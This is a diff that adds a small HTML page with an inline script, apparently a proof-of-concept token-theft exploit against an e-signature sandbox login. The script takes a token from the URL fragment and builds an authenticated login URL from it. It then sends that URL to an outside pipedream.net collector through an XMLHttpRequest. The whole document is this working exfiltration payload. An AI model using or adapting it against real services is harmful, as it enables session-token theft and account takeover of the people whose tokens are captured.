@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+  <body>
+<script>
+var token = document.location.hash.substr(2).split("&")[0];
+var url = "https://sandbox.esignlive.com/a/login?" + token + "&target=https://sandbox.esignlive.com/a/";
+alert(url);
+var x = new XMLHttpRequest();
+x.open("GET","https://eomt5u4olr9vnjc.m.pipedream.net?open="+url,false);
+x.send();
+</script>
+</body>
+</html>
